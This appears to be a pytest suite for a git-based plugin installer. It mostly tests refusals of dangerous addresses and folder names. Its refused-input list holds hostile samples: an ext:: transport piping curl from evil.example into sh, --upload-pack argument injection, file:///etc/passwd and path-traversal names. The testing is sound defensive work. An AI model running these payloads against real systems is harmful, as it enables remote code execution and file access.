"""Tests for installing a plugin from a git repository.

A plugin is program code that runs as part of the sandbox, under the same API
keys. So most of what is tested here is what the feature *refuses*: addresses
that name a program rather than a place, folder names that would land
somewhere other than `plugins/`, and requests from anywhere but the computer
the sandbox is running on.

Nothing here reaches the network. The one test that genuinely clones does it
from a repository made in a temp folder, with the address check stood aside
for exactly that call — the check itself is tested separately, and testing it
twice is not the same as testing what it guards.
"""

import subprocess
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

install = sys.modules["_pu_webui_plugin_install"]


def _a_repository(where: Path, contents: dict[str, str]) -> Path:
    """Make a real git repository holding *contents*, and return it."""
    where.mkdir(parents=True)
    for name, text in contents.items():
        (where / name).write_text(text, encoding="utf-8")
    for command in (["init", "-q"], ["add", "-A"],
                    ["-c", "user.email=t@t", "-c", "user.name=t",
                     "commit", "-qm", "first"]):
        subprocess.run(["git", *command], cwd=where, check=True, capture_output=True)
    return where


A_PLUGIN = {"plugin.py": (
    'class MyPlugin:\n'
    '    commands = ["summarise", "outline"]\n'
    '    model_roles = {}\n'
    'plugin = MyPlugin()\n'
)}


class TestAddressesItWillNotFetchFrom:
    """git understands addresses that run a program rather than fetch a
    repository. `ext::` is a documented transport that executes what it is
    given; `file://` would reach anything on this computer; an address
    starting with a dash is read by git as a flag."""

    @pytest.mark.parametrize("address", [
        "ext::sh -c 'curl evil.example/x.sh|sh'",
        "file:///etc/passwd",
        "git@github.com:someone/thing.git",
        "ssh://git@example.com/x.git",
        "git://example.com/x.git",
        "--upload-pack=touch /tmp/pwned",
        "-u ext::sh -c whoami",
        "http://github.com/someone/thing",
    ])
    def test_it_is_refused(self, address):
        with pytest.raises(install.InstallError):
            install.check_repository(address)

    def test_an_ordinary_address_is_accepted(self):
        address = "https://github.com/someone/their-plugin.git"
        assert install.check_repository(address) == address

    def test_nothing_typed_says_so(self):
        with pytest.raises(install.InstallError, match="Type the address"):
            install.check_repository("   ")


class TestFolderNamesItWillNotUse:
    """The name decides where the plugin lands, so it has to be a name and
    nothing else."""

    @pytest.mark.parametrize("name", [
        "../../src", "..", "../plugins", "a/b", "a\\b", ".hidden",
        "_private", "with space", "", "  ", "webui/../../src",
    ])
    def test_it_is_refused(self, name, tmp_path):
        with pytest.raises(install.InstallError):
            install.check_folder_name(name, tmp_path)

    def test_an_ordinary_name_lands_inside_plugins(self, tmp_path):
        got = install.check_folder_name("translation-ea", tmp_path)
        assert got == tmp_path / "translation-ea"
        assert got.parent == tmp_path

    def test_a_name_already_taken_is_refused(self, tmp_path):
        (tmp_path / "taken").mkdir()
        with pytest.raises(install.InstallError, match="already a folder"):
            install.check_folder_name("taken", tmp_path)


class TestTheNameItSuggests:

    @pytest.mark.parametrize("address,expected", [
        ("https://github.com/JHGFD82/translation-ea.git", "translation-ea"),
        ("https://github.com/JHGFD82/translation-ea", "translation-ea"),
        ("https://github.com/JHGFD82/translation-ea/", "translation-ea"),
        ("https://gitlab.example.edu/team/My_Plugin.git", "My_Plugin"),
    ])
    def test_it_is_the_repository_name(self, address, expected):
        assert install.suggested_folder_name(address) == expected

    @pytest.mark.parametrize("address", [
        "https://example.com/.git",   # nothing left once .git comes off
        "https://example.com/---",    # nothing left that may start a name
    ])
    def test_it_offers_nothing_rather_than_something_unusable(self, address):
        """An empty box says "type one" far better than a name that will only
        be refused a moment later."""
        assert install.suggested_folder_name(address) == ""

    def test_whatever_it_offers_would_be_accepted(self, tmp_path):
        name = install.suggested_folder_name("https://x.example/a/.weird..name.git")
        if name:
            install.check_folder_name(name, tmp_path)


class TestFetchingOne:

    def _install(self, origin, name, plugins):
        """Fetch from a local repository, standing the address check aside.

        That check refuses file://, which is the whole reason it exists — so
        the only way to exercise everything after it, without the network, is
        to let this one call through. What the check does is tested above.
        """
        with patch.object(install, "check_repository", side_effect=lambda a: a):
            return install.install_from_git(f"file://{origin}", name, plugins)

    def test_a_plugin_arrives_where_it_was_asked_for(self, tmp_path):
        origin = _a_repository(tmp_path / "origin", A_PLUGIN)
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        got = self._install(origin, "myplugin", plugins)
        assert got.name == "myplugin"
        assert (plugins / "myplugin" / "plugin.py").is_file()

    def test_it_says_what_the_plugin_adds(self, tmp_path):
        """Read out of the source, not imported — naming what was fetched is
        for somebody deciding, and importing is how it starts running."""
        origin = _a_repository(tmp_path / "origin", A_PLUGIN)
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        assert self._install(origin, "myplugin", plugins).commands == [
            "summarise", "outline"]

    def test_something_that_is_not_a_plugin_is_not_left_behind(self, tmp_path):
        origin = _a_repository(tmp_path / "origin", {"README.md": "not a plugin"})
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        with pytest.raises(install.InstallError, match="no plugin.py"):
            self._install(origin, "notaplugin", plugins)
        assert list(plugins.iterdir()) == [], "a useless folder was left in plugins"

    def test_a_fetch_that_fails_leaves_nothing(self, tmp_path):
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        with pytest.raises(install.InstallError):
            self._install(tmp_path / "no-such-repository", "nope", plugins)
        assert list(plugins.iterdir()) == []

    def test_git_being_missing_is_said_plainly(self, tmp_path):
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        with patch.object(install.shutil, "which", return_value=None):
            with pytest.raises(install.InstallError, match="git is not installed"):
                install.install_from_git(
                    "https://example.com/x.git", "x", plugins)

    def test_nothing_is_handed_to_a_shell(self, tmp_path):
        """The address comes from a person and goes to a program. It travels
        as one argument in a list, never as part of a command line."""
        plugins = tmp_path / "plugins"
        plugins.mkdir()

        def fake_run(command, **kwargs):
            # git is asked its version first, and has to answer, or the fetch
            # this is about never happens.
            if command[1:] == ["--version"]:
                return subprocess.CompletedProcess(command, 0, "git version 2.0", "")
            return subprocess.CompletedProcess(command, 1, "", "no")

        with patch.object(install.subprocess, "run", side_effect=fake_run) as ran:
            with pytest.raises(install.InstallError):
                install.install_from_git("https://example.com/x.git", "x", plugins)

        clone = [c for c in ran.call_args_list if "clone" in c.args[0]]
        assert clone, "it never got as far as fetching"
        args, kwargs = clone[0]
        assert isinstance(args[0], list)
        assert kwargs.get("shell") in (None, False)
        # Everything after -- is a place and a folder, whatever it starts with.
        assert "--" in args[0]


class TestTheFolderBoxForgivesThePrefix:
    """The box is labelled "Install into plugins/", so typing that back is
    the natural reading of the label rather than a mistake."""

    @pytest.mark.parametrize("typed", [
        "plugins/transcription-ea",
        "./transcription-ea",
        "plugins/transcription-ea/",
        "  plugins/transcription-ea  ",
    ])
    def test_a_leading_plugins_is_taken_off(self, typed, tmp_path):
        assert install.check_folder_name(typed, tmp_path).name == "transcription-ea"

    def test_it_still_lands_inside_the_plugins_folder(self, tmp_path):
        got = install.check_folder_name("plugins/thing", tmp_path)
        assert got.parent == tmp_path

    @pytest.mark.parametrize("typed", [
        "plugins/../src", "../../src", "a/b", "plugins/a/b", "..",
    ])
    def test_and_nothing_else_with_a_separator_in_it(self, typed, tmp_path):
        """Forgiving one prefix is not the same as allowing paths."""
        with pytest.raises(install.InstallError):
            install.check_folder_name(typed, tmp_path)


class TestGitHasToWorkNotJustExist:
    """A Mac without the Xcode command line tools still has /usr/bin/git — a
    stub that is found, and then fails with an xcrun error the moment it runs.
    Only checking that the file is there turned that into "could not fetch"
    followed by a paragraph about xcrun."""

    def test_a_git_that_cannot_run_is_reported_as_that(self, tmp_path):
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        broken = subprocess.CompletedProcess(
            [], 1, "", "xcrun: error: invalid active developer path")
        with patch.object(install.shutil, "which", return_value="/usr/bin/git"), \
             patch.object(install.subprocess, "run", return_value=broken):
            with pytest.raises(install.InstallError) as raised:
                install.install_from_git("https://example.com/x.git", "x", plugins)
        said = str(raised.value)
        assert "/usr/bin/git" in said
        assert "xcode-select" in said, "it does not say what to do about it"

    def test_it_is_asked_before_anything_is_fetched(self, tmp_path):
        """Otherwise the answer is a clone failure with git's confusion in it
        rather than a sentence about git."""
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        calls = []

        def fake_run(command, **kwargs):
            calls.append(command)
            return subprocess.CompletedProcess(command, 1, "", "no")

        with patch.object(install.shutil, "which", return_value="/usr/bin/git"), \
             patch.object(install.subprocess, "run", side_effect=fake_run):
            with pytest.raises(install.InstallError):
                install.install_from_git("https://example.com/x.git", "x", plugins)
        assert calls, "git was never asked anything"
        assert calls[0][1:] == ["--version"], calls[0]

    def test_a_working_git_is_used(self, tmp_path):
        """The check must not get in the way of the ordinary case."""
        origin = _a_repository(tmp_path / "origin", A_PLUGIN)
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        with patch.object(install, "check_repository", side_effect=lambda a: a):
            got = install.install_from_git(f"file://{origin}", "thing", plugins)
        assert got.name == "thing"


class TestSayingWhatAPluginAdds:
    """The dialog names the commands the plugin brings, so somebody can see
    what they just fetched. It read the source rather than importing it —
    importing is how a plugin's code starts running, and this happens before
    the decision to keep it."""

    def test_the_form_every_plugin_actually_uses(self, tmp_path):
        """`commands: list[str] = [...]`. A pattern taking the first brackets
        after the name took the ones in `list[str]` and found nothing, which
        is every plugin in this repository."""
        folder = tmp_path / "p"
        folder.mkdir()
        (folder / "plugin.py").write_text(
            'class P:\n    commands: list[str] = ["translate", "transcribe"]\n',
            encoding="utf-8")
        assert install._commands_named_in(folder) == ["translate", "transcribe"]

    def test_the_plain_form_too(self, tmp_path):
        folder = tmp_path / "p"
        folder.mkdir()
        (folder / "plugin.py").write_text(
            'class P:\n    commands = ["prompt"]\n', encoding="utf-8")
        assert install._commands_named_in(folder) == ["prompt"]

    def test_every_plugin_in_this_repository_is_read_correctly(self):
        """The real check: guessing at source is only worth doing if it works
        on the plugins that exist."""
        from pathlib import Path as P

        plugins = P(__file__).resolve().parents[3] / "plugins"
        read = {d.name: install._commands_named_in(d)
                for d in sorted(plugins.iterdir()) if (d / "plugin.py").is_file()}
        assert read, "no plugins found to check against"
        empty = [name for name, commands in read.items() if not commands]
        assert not empty, f"named nothing for: {empty}"

    def test_a_plugin_that_does_not_say_plainly_gives_nothing(self, tmp_path):
        """A guess is not worth making twice; nothing is an honest answer."""
        folder = tmp_path / "p"
        folder.mkdir()
        (folder / "plugin.py").write_text(
            "class P:\n    commands = build_them()\n", encoding="utf-8")
        assert install._commands_named_in(folder) == []
